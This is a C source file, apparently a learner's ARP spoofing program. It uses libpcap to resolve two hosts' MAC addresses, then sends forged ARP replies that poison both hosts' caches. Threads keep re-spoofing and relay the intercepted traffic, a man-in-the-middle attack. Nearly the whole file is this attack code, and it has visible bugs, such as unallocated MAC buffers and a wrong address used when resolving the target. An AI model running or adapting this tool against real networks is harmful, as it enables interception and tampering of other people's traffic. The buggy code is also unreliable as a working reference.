#include "arp_lib.h"
#include <pthread.h>


struct in_addr* sender_list;
struct in_addr* target_list;
int spoof_num;
uint8_t **sender_MAC;
uint8_t **target_MAC;
uint8_t my_MAC[6];
uint8_t broadcast_MAC[6];

struct distribute_packet p_list;




int main(int argc, char *argv[])
{
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct in_addr my_IP;
	pthread_t pthread;
	targ tt;
	int i;
	
	for(i=0;i<6;i++)
	{
		broadcast_MAC[i] = 0xff;
	}
	if(argc != 4)
	{
		printf("Usage: ./arp_spoorf [interface] [sender_ip] [target_ip]");
		return 0;
	}
	spoof_num = ((argc - 2)/2);
	sender_list = (struct in_addr*)malloc(spoof_num * sizeof(struct in_addr));
	target_list = (struct in_addr*)malloc(spoof_num * sizeof(struct in_addr));
	for(i=0 ; i < (argc - 2)/2 ;i ++)
	{
		inet_aton(argv[2 * i + 2],&sender_list[i]);
		inet_aton(argv[2 * i + 3],&target_list[i]);
	} // input data

	
	handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
	get_addr(my_MAC, &my_IP, argv[1]);

	sender_MAC = (uint8_t**)malloc(spoof_num * sizeof(uint8_t*));
	target_MAC = (uint8_t**)malloc(spoof_num * sizeof(uint8_t*));

	for(i=0;i<spoof_num;i++)
	{
		rs_ARP(handle, my_MAC, broadcast_MAC, &my_IP, &sender_list[i],1); //broadcast_request
		get_senders_mac(handle, &sender_list[i],sender_MAC[i]);
		rs_ARP(handle, my_MAC, broadcast_MAC, &my_IP, &target_list[i],1);
		get_senders_mac(handle, &sender_list[i],target_MAC[i]);
	}
		
	for(i=0;i<spoof_num;i++)
	{	
		rs_ARP(handle, my_MAC, sender_MAC[i], &target_list[i], &sender_list[i],2);
		rs_ARP(handle, my_MAC, target_MAC[i], &sender_list[i], &target_list[i],2);
	}
	
	pthread_create(&pthread, NULL, (void*)distribute_packet,(void*)handle);


	for(i=0;i<spoof_num;i++)
	{
		tt.h = handle;
		tt.num = i;
		pthread_create(&pthread, NULL, (void*)spoofing, (void*)&tt);
	}
	
	while(1)
	{
		if(1) continue;
	}
	


	return 0;

}
